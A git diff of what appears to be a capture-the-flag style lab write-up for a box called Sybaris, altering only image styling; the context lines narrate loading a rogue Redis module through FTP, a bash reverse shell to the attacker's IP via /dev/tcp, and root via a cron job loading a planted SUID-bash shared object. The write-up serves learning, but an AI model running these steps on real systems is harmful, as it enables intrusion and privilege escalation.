@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 
 I check out port 80 by entering it into the web browser and begin a directory scan in the background: 
 
-![Sybaris1.png](/assets/images/Sybaris/Sybaris1.png){: .center-aligned width="600px"}
+![Sybaris1.png](/assets/images/Sybaris/Sybaris1.png){: .responsive-image}
 
 Seems like a basic blog run over the `HTMLy` platform. It doesn't really look like there's anything here, and the directory scan reveals a `/login` page but not much else. Entering any credentials to the admin page seems to take us to `http://$IP/login/login`. I also find nothing for HTMLy exploits. 
 
@@ -34,23 +34,23 @@ So it's time to start looking for exploits at this point. I give [redis-rogue-se
 
 When I tried to upload a test file into the FTP server early on, I was unable to, and crucially, the FTP hung when I tried to `cd pub`. It actually hung another time as well. I assumed we could not access this directory, but after reading a writeup, I was incorrect, so I tried again. This time it worked. I'm ot sure why it worked sometimes and not others, maybe I was wearing it out with a directory scan or something, but regardless, we need to `put` the compiled module /`redis-rogue-server/exp.so` into pub, the full PATH of which is `/var/ftp/pub/exp.so`. From there we use `MODULE LOAD /var/ftp/pub/exp.so`, which allows us to use `system.exec` to execute commands as so:
 
-![Sybaris2.png](/assets/images/Sybaris/Sybaris2.png){: .center-aligned width="600px"}
+![Sybaris2.png](/assets/images/Sybaris/Sybaris2.png){: .responsive-image}
 
 After that I tried uploading a reverse shell which I got to download from my server but didn't execute, so I just ran a simple `system.exec "/bin/bash -i >& /dev/tcp/192.168.45.183/6379 0>&1"` from the redis-cli, and I was able to catch the shell with a penelope listener as pablo. 
 
-![Sybaris3.png](/assets/images/Sybaris/Sybaris3.png){: .center-aligned width="600px"}
+![Sybaris3.png](/assets/images/Sybaris/Sybaris3.png){: .responsive-image}
 
 I start enumerating from there and check out lse.sh. First things first:
 
-![Sybaris4.png](/assets/images/Sybaris/Sybaris4.png){: .center-aligned width="600px"}
+![Sybaris4.png](/assets/images/Sybaris/Sybaris4.png){: .responsive-image}
 
 It's empty. Thanks for nothing lse.
 
-![Sybaris5.png](/assets/images/Sybaris/Sybaris5.png){: .center-aligned width="600px"}
+![Sybaris5.png](/assets/images/Sybaris/Sybaris5.png){: .responsive-image}
 
 Here we go. Cron-job and a writable path. If we try to run the binary, we see there is a missing object file. We can create it, and it will be run with the log-sweeper binary. 
 
-![Sybaris6.png](/assets/images/Sybaris/Sybaris6.png){: .center-aligned width="600px"}
+![Sybaris6.png](/assets/images/Sybaris/Sybaris6.png){: .responsive-image}
 
 We create a c file on our kali machine:
 ```
@@ -66,4 +66,4 @@ void inject() {
 
 And transfer it to our target machine in the `/usr/local/lib/dev` folder. Then we run gcc on it: `gcc -shared -fPIC -nostartfiles -o utils utils.so`. This file will move a copy of `bash` to `/tmp` and add the SUID bit. That means when it runs, there should be a copy of bash in /tmp, and we can run `/tmp/bash -p` and get root. And it does and we do. 
 
-![Sybaris7.png](/assets/images/Sybaris/Sybaris7.png){: .center-aligned width="600px"}
+![Sybaris7.png](/assets/images/Sybaris/Sybaris7.png){: .responsive-image}
